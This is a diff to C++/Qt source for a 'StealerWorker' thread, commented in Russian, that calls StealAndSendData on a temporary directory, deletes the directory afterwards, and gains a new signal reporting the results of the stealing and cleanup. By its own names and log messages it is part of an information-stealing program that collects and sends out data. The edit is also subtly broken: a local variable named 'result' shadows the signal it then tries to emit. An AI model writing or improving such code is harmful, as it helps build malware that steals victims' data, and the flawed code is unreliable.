@@ -26,10 +26,12 @@ public slots:
         }
 
         try {
-            window->StealAndSendData(tempDir);
+            std::string result = window->StealAndSendData(tempDir); // Сохраняем результат
             qDebug("StealerWorker: Data stealing and sending completed successfully");
+            emit result(QString::fromStdString(result)); // Отправляем результат через сигнал
         } catch (const std::exception& e) {
             qWarning("StealerWorker: Exception during data stealing: %s", e.what());
+            emit result("Ошибка: " + QString::fromStdString(e.what())); // Отправляем ошибку
         }
 
         // Очистка временной директории после завершения
@@ -38,8 +40,10 @@ public slots:
         if (ec) {
             qWarning("StealerWorker: Failed to remove temp directory %s: %s", 
                      tempDir.c_str(), ec.message().c_str());
+            emit result("Ошибка удаления временной директории: " + QString::fromStdString(ec.message()));
         } else {
             qDebug("StealerWorker: Temp directory %s removed", tempDir.c_str());
+            emit result("Временная директория удалена: " + QString::fromStdString(tempDir));
         }
 
         emit finished();
@@ -47,6 +51,7 @@ public slots:
 
 signals:
     void finished();
+    void result(const QString& message); // Новый сигнал для передачи результата
 
 private:
     MainWindow* window;
